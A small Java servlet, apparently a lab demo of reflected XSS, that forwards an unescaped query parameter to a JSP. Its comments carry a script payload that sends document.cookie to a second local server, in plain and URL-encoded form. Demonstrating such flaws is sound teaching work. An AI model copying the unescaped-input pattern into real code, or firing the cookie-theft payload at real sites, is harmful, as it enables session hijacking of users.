package com.example.demo;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.IOException;

@WebServlet(name = "ReflectedXSS", value= "/ReflectedXSS")
public class ReflectedXSS extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        // q = http://localhost:8080/?q=<script>var i =new Image; i.src= 'http://localhost:8082/second?ck='+document.cookie;</script>
        // encode http://localhost:8080/?q=%3Cscript%3Evar%20i%20=new%20Image;%20i.src=%20%27http://localhost:8082/second?ck=%27%2Bdocument.cookie;%3C/script%3E
        String q = req.getParameter("q");
        req.setAttribute("abc", q);
        req.getRequestDispatcher("/test.jsp").forward(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
